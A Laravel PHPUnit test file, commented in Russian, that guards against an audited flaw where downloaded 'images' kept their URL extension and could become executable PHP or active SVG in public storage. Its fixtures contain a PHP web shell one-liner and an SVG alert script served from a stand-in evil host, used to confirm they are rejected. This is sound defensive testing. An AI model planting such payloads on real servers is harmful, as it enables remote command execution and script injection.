<?php

namespace Tests\Feature;

use App\Service\ContentImageService;
use App\Support\PinnedTarget;
use App\Support\UrlSafetyChecker;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Регрессия на Critical из аудита 2026-08-09.
 *
 * storeImage() брал расширение сохраняемого файла ИЗ URL источника, а
 * содержимое не проверял вовсе: WebpConverterService возвращает null для
 * всего, что не PNG/JPEG/WEBP, и тогда чужие байты ложились на диск как есть.
 * Каталог storage/app/public отдаётся Apache напрямую по /storage, а
 * SetHandler для .ph(ar|p|tml) объявлен глобально — то есть
 * `<img src="https://evil.tld/x.php">` на разбираемой странице давал RCE.
 * Вторым вектором шёл .svg: активный контент с нашего origin, причём мимо
 * SecurityHeaders (на статику CSP не навешивается).
 *
 * На проде такие файлы уже лежали: 12 «.svg», внутри которых был текст
 * «Error CF 9189202932», и 3 «.live», внутри которых были PNG.
 */
class ContentImageServiceExtensionTest extends TestCase
{
    /**
     * UrlSafetyChecker подменяется стабом намеренно: он делает живой DNS-резолв,
     * и на несуществующем домене fetchBinary() вернул бы null ещё до storeImage().
     * Тест тогда «проходил» бы из-за отсутствия DNS, а не из-за проверки
     * содержимого — то есть не поймал бы регрессию.
     */
    private function service(): ContentImageService
    {
        $checker = new class extends UrlSafetyChecker
        {
            public function resolveTarget(string $url): ?PinnedTarget
            {
                return new PinnedTarget($url, (string) parse_url($url, PHP_URL_HOST), 443, '93.184.216.34', false);
            }
        };

        return new ContentImageService($checker);
    }

    public function test_php_payload_disguised_as_image_is_not_stored(): void
    {
        Storage::fake('public');
        Http::fake([
            'https://evil.test/*' => Http::response('<?php system($_GET["c"]); ?>', 200, [
                'Content-Type' => 'image/png',
            ]),
        ]);

        $path = $this->service()->downloadImage('https://evil.test/shell.php');

        $this->assertNull($path, 'Не-картинка не должна сохраняться вообще');
        $this->assertEmpty(
            Storage::disk('public')->allFiles(),
            'В storage не должно появиться ни одного файла'
        );
    }

    public function test_svg_is_refused(): void
    {
        Storage::fake('public');
        Http::fake([
            'https://evil.test/*' => Http::response(
                '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>',
                200,
                ['Content-Type' => 'image/svg+xml']
            ),
        ]);

        $path = $this->service()->downloadImage('https://evil.test/logo.svg');

        $this->assertNull($path);
        $this->assertEmpty(Storage::disk('public')->allFiles());
    }

    /**
     * Ровно тот случай, что уже лежит на проде: Cloudflare отдал текстовую
     * заглушку, а URL заканчивался на .svg.
     */
    public function test_text_error_page_served_as_image_is_refused(): void
    {
        Storage::fake('public');
        Http::fake([
            'https://cdn.test/*' => Http::response('Error CF 9189202932', 200),
        ]);

        $this->assertNull($this->service()->downloadImage('https://cdn.test/pic.svg'));
        $this->assertEmpty(Storage::disk('public')->allFiles());
    }

    public function test_real_png_is_stored_with_extension_from_content_not_url(): void
    {
        Storage::fake('public');
        Http::fake([
            // Расширение в URL врёт: содержимое — PNG, путь говорит «.live».
            'https://cdn.test/*' => Http::response($this->pngBytes(), 200),
        ]);

        $path = $this->service()->downloadImage('https://cdn.test/image.live');

        $this->assertNotNull($path);
        // webp — если конвертация дала выигрыш, png — если оригинал оставили.
        // Главное, что расширение не «live».
        $this->assertMatchesRegularExpression('#^images/content/[A-Za-z0-9]{40}\.(png|webp)$#', $path);
        Storage::disk('public')->assertExists($path);
    }
}
